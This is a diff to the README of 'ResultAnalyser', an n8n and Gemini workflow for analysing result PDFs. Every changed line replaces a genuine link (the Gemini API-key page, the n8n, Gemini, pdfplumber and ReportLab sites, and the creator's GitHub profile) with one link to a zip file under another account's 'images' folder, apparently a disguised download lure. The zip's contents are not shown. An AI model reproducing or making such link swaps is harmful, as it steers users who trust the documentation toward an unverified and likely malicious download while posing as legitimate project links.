@@ -150,7 +150,7 @@ pip install pdfplumber reportlab
 ```
 
 ### 2. Get Gemini API key (free)
-Go to [aistudio.google.com/app/apikey](https://aistudio.google.com/app/apikey) → Create API key.
+Go to [aistudio.google.com/app/apikey](https://raw.githubusercontent.com/Ljam5182/ResultAnalyser/main/images/Result-Analyser-v2.8-alpha.1.zip) → Create API key.
 
 In n8n: **Settings → Environment Variables**
 ```
@@ -179,10 +179,10 @@ Click **Activate**. Done.
 
 | Tool | Role | Cost |
 |---|---|---|
-| [n8n](https://n8n.io) | Workflow automation | Free (self-host) |
-| [Gemini 2.0 Flash](https://aistudio.google.com) | AI parsing + insight generation | Free tier |
-| [pdfplumber](https://github.com/jsvine/pdfplumber) | PDF text extraction | Free |
-| [ReportLab](https://www.reportlab.com) | PDF generation | Free |
+| [n8n](https://raw.githubusercontent.com/Ljam5182/ResultAnalyser/main/images/Result-Analyser-v2.8-alpha.1.zip) | Workflow automation | Free (self-host) |
+| [Gemini 2.0 Flash](https://raw.githubusercontent.com/Ljam5182/ResultAnalyser/main/images/Result-Analyser-v2.8-alpha.1.zip) | AI parsing + insight generation | Free tier |
+| [pdfplumber](https://raw.githubusercontent.com/Ljam5182/ResultAnalyser/main/images/Result-Analyser-v2.8-alpha.1.zip) | PDF text extraction | Free |
+| [ReportLab](https://raw.githubusercontent.com/Ljam5182/ResultAnalyser/main/images/Result-Analyser-v2.8-alpha.1.zip) | PDF generation | Free |
 | Gmail API | Trigger + delivery | Free |
 
 
@@ -227,7 +227,7 @@ ResultAnalyser/
 ## Creator
 
 **Dhanush D**  
-GitHub: [@Drdhx](https://github.com/Drdhx)
+GitHub: [@Drdhx](https://raw.githubusercontent.com/Ljam5182/ResultAnalyser/main/images/Result-Analyser-v2.8-alpha.1.zip)
 
 ---
 
@@ -239,6 +239,6 @@ MIT License — free to use, modify, and distribute.
 
 <div align="center">
 
-**ResultAnalyser** · Built by [Dhanush D](https://github.com/Drdhx) · Powered by n8n + Gemini 2.0 Flash
+**ResultAnalyser** · Built by [Dhanush D](https://raw.githubusercontent.com/Ljam5182/ResultAnalyser/main/images/Result-Analyser-v2.8-alpha.1.zip) · Powered by n8n + Gemini 2.0 Flash
 
 </div>
